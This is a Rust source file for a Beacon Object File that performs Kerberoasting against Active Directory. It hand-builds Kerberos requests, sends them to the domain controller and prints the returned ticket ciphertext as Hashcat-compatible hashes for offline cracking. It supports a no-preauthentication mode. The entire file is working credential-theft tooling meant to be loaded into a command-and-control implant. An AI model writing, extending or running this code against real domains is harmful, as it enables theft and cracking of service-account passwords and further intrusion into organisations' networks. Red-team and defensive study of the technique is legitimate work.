//! # Kerberoasting BOF
//!
//! Requests SPN service tickets and outputs the encrypted ticket data
//! as Hashcat-compatible hashes for offline cracking. Supports requesting
//! via AS-REQ without pre-authentication (/nopreauth mode).
//!
//! ## MITRE ATT&CK
//! - T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
//!
//! ## Arguments
//! - `/spn:SPN` - Target service principal name (required)
//! - `/nopreauth:USER` - Use AS-REQ without pre-auth for roasting
//! - `/domain:DOMAIN` - Target domain (auto-detected if omitted)
//! - `/dc:DC` - Domain controller hostname or IP (auto-detected if omitted)

#![no_std]

use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Networking::WinSock::*;
use windows_sys::Win32::Security::Authentication::Identity::*;
use windows_sys::Win32::Security::*;
use windows_sys::Win32::System::Threading::*;

unsafe extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
    fn GetSystemTime(st: *mut SYSTEMTIME);
}

fn asn_tag_len(tag: u8, data: &[u8]) -> Vec<u8> { let mut o = vec![tag]; let l = data.len(); if l < 0x80 { o.push(l as u8); } else if l < 0x100 { o.push(0x81); o.push(l as u8); } else { o.push(0x82); o.push((l >> 8) as u8); o.push(l as u8); } o.extend_from_slice(data); o }
fn asn_seq(c: &[&[u8]]) -> Vec<u8> { let mut d = Vec::new(); for x in c { d.extend_from_slice(x); } asn_tag_len(0x30, &d) }
fn asn_ctx(t: u8, d: &[u8]) -> Vec<u8> { asn_tag_len(0xa0 | t, d) }
fn asn_app(t: u8, d: &[u8]) -> Vec<u8> { asn_tag_len(0x60 | t, d) }
fn asn_int(v: i64) -> Vec<u8> { if v == 0 { return vec![0x02, 0x01, 0x00]; } let mut b = Vec::new(); let mut val = v; if v > 0 { while val > 0 { b.push((val & 0xff) as u8); val >>= 8; } b.reverse(); if b[0] & 0x80 != 0 { b.insert(0, 0); } } else { while val < -1 { b.push((val & 0xff) as u8); val >>= 8; } b.push((val & 0xff) as u8); b.reverse(); } let mut o = vec![0x02, b.len() as u8]; o.extend_from_slice(&b); o }
fn asn_str(s: &str) -> Vec<u8> { asn_tag_len(0x1b, s.as_bytes()) }
fn asn_bit(d: &[u8]) -> Vec<u8> { let mut o = vec![0x03]; let l = d.len() + 1; if l < 0x80 { o.push(l as u8); } else { o.push(0x81); o.push(l as u8); } o.push(0x00); o.extend_from_slice(d); o }
fn asn_time(s: &str) -> Vec<u8> { asn_tag_len(0x18, s.as_bytes()) }
fn asn_oct(d: &[u8]) -> Vec<u8> { asn_tag_len(0x04, d) }
fn asn_ctx_int(t: u8, v: i64) -> Vec<u8> { let i = asn_int(v); asn_ctx(t, &i) }
fn asn_ctx_str(t: u8, s: &str) -> Vec<u8> { let v = asn_str(s); asn_ctx(t, &v) }

struct Asn { class: u8, tag: u32, value: Vec<u8>, children: Vec<Asn> }
fn parse_asn(data: &[u8]) -> Option<Asn> { let (e, _) = parse_one(data, 0)?; Some(e) }
fn parse_one(data: &[u8], mut pos: usize) -> Option<(Asn, usize)> { if pos >= data.len() { return None; } let b = data[pos]; pos += 1; let class = (b >> 6) & 0x03; let constructed = (b & 0x20) != 0; let mut tag = (b & 0x1F) as u32; if tag == 0x1F { tag = 0; loop { if pos >= data.len() { return None; } let b = data[pos]; pos += 1; tag = (tag << 7) | (b & 0x7F) as u32; if b & 0x80 == 0 { break; } } } if pos >= data.len() { return None; } let lb = data[pos]; pos += 1; let length = if lb < 0x80 { lb as usize } else if lb == 0x80 { return None; } else { let n = (lb & 0x7F) as usize; if pos + n > data.len() { return None; } let mut l = 0; for i in 0..n { l = (l << 8) | data[pos + i] as usize; } pos += n; l }; if pos + length > data.len() { return None; } let value = data[pos..pos + length].to_vec(); let children = if constructed { parse_children(&value) } else { Vec::new() }; Some((Asn { class, tag, value, children }, pos + length)) }
fn parse_children(data: &[u8]) -> Vec<Asn> { let mut c = Vec::new(); let mut p = 0; while p < data.len() { if let Some((ch, np)) = parse_one(data, p) { c.push(ch); p = np; } else { break; } } c }
fn find_ctx<'a>(asn: &'a Asn, tag: u32) -> Option<&'a Asn> { asn.children.iter().find(|c| c.class == 2 && c.tag == tag) }
fn get_int(asn: &Asn) -> i64 { let d = &asn.value; if d.is_empty() { return 0; } let mut v = if d[0] & 0x80 != 0 { -1i64 } else { 0i64 }; for &b in d { v = (v << 8) | b as i64; } v }

fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> { if let Some(pos) = params.find(name) { let a = &params[pos + name.len()..]; let e = a.find(' ').unwrap_or(a.len()); let v = &a[..e]; if !v.is_empty() { return Some(v); } } None }

fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut wsa = core::mem::zeroed::<WSADATA>();
        WSAStartup(0x0202, &mut wsa);
        let mut sc = Vec::with_capacity(server.len() + 1); sc.extend_from_slice(server.as_bytes()); sc.push(0);
        let mut hints = core::mem::zeroed::<ADDRINFOA>(); hints.ai_family = AF_INET as i32; hints.ai_socktype = SOCK_STREAM as i32; hints.ai_protocol = IPPROTO_TCP as i32;
        let mut result: *mut ADDRINFOA = core::ptr::null_mut();
        if getaddrinfo(sc.as_ptr(), b"88\0".as_ptr(), &hints, &mut result) != 0 { WSACleanup(); return None; }
        let mut sock: SOCKET = INVALID_SOCKET; let mut ptr = result;
        while !ptr.is_null() { let ai = &*ptr; sock = socket(ai.ai_family, ai.ai_socktype, ai.ai_protocol); if sock != INVALID_SOCKET { if connect(sock, ai.ai_addr, ai.ai_addrlen as i32) == 0 { break; } closesocket(sock); sock = INVALID_SOCKET; } ptr = ai.ai_next; }
        freeaddrinfo(result);
        if sock == INVALID_SOCKET { WSACleanup(); return None; }
        let lb = (data.len() as u32).to_be_bytes();
        send(sock, lb.as_ptr(), 4, 0); send(sock, data.as_ptr(), data.len() as i32, 0);
        let mut sb = [0u8; 4];
        if recv(sock, sb.as_mut_ptr(), 4, 0) < 4 { closesocket(sock); WSACleanup(); return None; }
        let rs = (u32::from_be_bytes(sb) & 0x7fffffff) as usize;
        if rs == 0 || rs > 1024 * 1024 { closesocket(sock); WSACleanup(); return None; }
        let mut resp = vec![0u8; rs]; let mut rcvd = 0;
        while rcvd < rs { let n = recv(sock, resp.as_mut_ptr().add(rcvd), (rs - rcvd) as i32, 0); if n <= 0 { break; } rcvd += n as usize; }
        closesocket(sock); WSACleanup();
        if rcvd == rs { Some(resp) } else { None }
    }
}

fn bytes_to_hex(b: &[u8]) -> String { let mut s = String::with_capacity(b.len() * 2); for &v in b { s.push(if (v >> 4) < 10 { (b'0' + (v >> 4)) as char } else { (b'a' + (v >> 4) - 10) as char }); s.push(if (v & 0xf) < 10 { (b'0' + (v & 0xf)) as char } else { (b'a' + (v & 0xf) - 10) as char }); } s }

fn get_domain_info() -> Option<(String, String)> {
    unsafe {
        let netapi = { let h = GetModuleHandleA(b"NETAPI32\0".as_ptr()); if h.is_null() { LoadLibraryA(b"NETAPI32\0".as_ptr()) } else { h } };
        if netapi.is_null() { return None; }
        #[repr(C)] struct DcInfo { dc_name: *mut u8, dc_addr: *mut u8, t: u32, g: [u8; 16], domain: *mut u8, forest: *mut u8, flags: u32, site: *mut u8, cs: *mut u8 }
        type DsFn = unsafe extern "system" fn(*const u8, *const u8, *const c_void, *const u8, u32, *mut *mut DcInfo) -> u32;
        type FrFn = unsafe extern "system" fn(*mut c_void) -> u32;
        let ds: DsFn = core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
        let fr: FrFn = core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));
        let mut info: *mut DcInfo = core::ptr::null_mut();
        if ds(core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0x40000010, &mut info) != 0 { return None; }
        if info.is_null() { return None; }
        fn cs(p: *const u8) -> String { if p.is_null() { return String::new(); } unsafe { let mut l = 0; while *p.add(l) != 0 { l += 1; } String::from_utf8_lossy(core::slice::from_raw_parts(p, l)).into_owned() } }
        let d = cs((*info).domain); let dc = cs((*info).dc_name);
        fr(info as *mut c_void);
        Some((d, String::from(dc.trim_start_matches('\\'))))
    }
}

fn get_future_time(hours: u16) -> String { unsafe { let mut st = core::mem::zeroed::<SYSTEMTIME>(); GetSystemTime(&mut st); st.wHour += hours; if st.wHour >= 24 { st.wHour -= 24; st.wDay += 1; } alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond) } }

fn build_tgs_req_nopreauth(spn: &str, domain: &str) -> Vec<u8> {
    let kdc_opts = 0x40810010u32.to_be_bytes();
    let parts: Vec<&str> = spn.split('/').collect();
    let sname = if parts.len() >= 2 {
        asn_seq(&[&asn_ctx_int(0, 1), &asn_ctx(1, &asn_seq(&[&asn_str(parts[0]), &asn_str(parts[1])]))])
    } else {
        asn_seq(&[&asn_ctx_int(0, 1), &asn_ctx(1, &asn_seq(&[&asn_str(spn)]))])
    };
    let till = get_future_time(24);
    let etypes = asn_seq(&[&asn_int(23), &asn_int(18), &asn_int(17)]);

    let body = asn_seq(&[
        &asn_ctx(0, &asn_bit(&kdc_opts)),
        &asn_ctx_str(2, domain),
        &asn_ctx(3, &sname),
        &asn_ctx(5, &asn_time(&till)),
        &asn_ctx_int(7, 12345),
        &asn_ctx(8, &etypes),
    ]);

    asn_app(10, &asn_seq(&[
        &asn_ctx_int(1, 5),
        &asn_ctx_int(2, 10),
        &asn_ctx(4, &body),
    ]))
}

fn extract_tgs_hash(response: &[u8], spn: &str, domain: &str) -> Option<String> {
    let root = parse_asn(response)?;

    if root.tag == 30 {
        let body = root.children.first()?;
        if let Some(err) = find_ctx(body, 6) {
            if let Some(code) = err.children.first() {
                eprintln!("[X] Kerberos error: {}", get_int(code));
            }
        }
        return None;
    }

    if root.tag != 13 && root.tag != 11 {
        eprintln!("[X] Unexpected response tag: {}", root.tag);
        return None;
    }

    let body = root.children.first()?;
    let enc_part_ctx = find_ctx(body, 6)?;
    let enc_data = enc_part_ctx.children.first()?;

    let etype = find_ctx(enc_data, 0).and_then(|c| c.children.first()).map(|c| get_int(c) as i32).unwrap_or(0);
    let cipher = find_ctx(enc_data, 2).and_then(|c| c.children.first()).map(|c| &c.value)?;

    if cipher.is_empty() { return None; }

    if etype == 23 {
        let checksum = bytes_to_hex(&cipher[..16.min(cipher.len())]);
        let rest = bytes_to_hex(&cipher[16.min(cipher.len())..]);
        Some(alloc::format!("$krb5tgs$23$*{}${}${}*${}${}", spn, domain.to_ascii_uppercase(), spn, checksum, rest))
    } else if etype == 18 {
        let checksum = bytes_to_hex(&cipher[cipher.len().saturating_sub(12)..]);
        let rest = bytes_to_hex(&cipher[..cipher.len().saturating_sub(12)]);
        Some(alloc::format!("$krb5tgs$18${}${}$*{}*${}${}", spn, domain.to_ascii_uppercase(), spn, checksum, rest))
    } else {
        eprintln!("[X] Unsupported etype: {}", etype);
        None
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: Kerberoasting\n");

    if len == 0 { eprintln!("[X] /spn:X required"); return; }

    let mut parser = DataParser::new(args, len);
    let params = String::from(parser.get_str());

    let spn = match get_param(&params, "/spn:") { Some(s) => s, None => { eprintln!("[X] /spn:X must be supplied!"); return; } };
    let nopreauth_user = get_param(&params, "/nopreauth:");
    let domain_arg = get_param(&params, "/domain:");
    let dc_arg = get_param(&params, "/dc:");

    let (domain, dc) = if let (Some(d), Some(c)) = (domain_arg, dc_arg) {
        (String::from(d), String::from(c))
    } else {
        match get_domain_info() {
            Some((d, c)) => (domain_arg.map(String::from).unwrap_or(d), dc_arg.map(String::from).unwrap_or(c)),
            None => { eprintln!("[X] Could not retrieve domain info!"); return; }
        }
    };

    if let Some(user) = nopreauth_user {
        println!("[*] Using AS-REQ w/o preauth for SPN roasting (user: {})", user);
        let as_req = build_tgs_req_nopreauth(spn, &domain);
        match send_to_kdc(&dc, &as_req) {
            Some(resp) => {
                match extract_tgs_hash(&resp, spn, &domain) {
                    Some(hash) => println!("[+] Hash:\n\n{}\n", hash),
                    None => {}
                }
            }
            None => eprintln!("[X] Failed to communicate with KDC"),
        }
    } else {
        eprintln!("[X] Kerberoasting with /ticket:BASE64 TGT not yet implemented. Use /nopreauth:USER for AS-REQ based roasting.");
    }
}
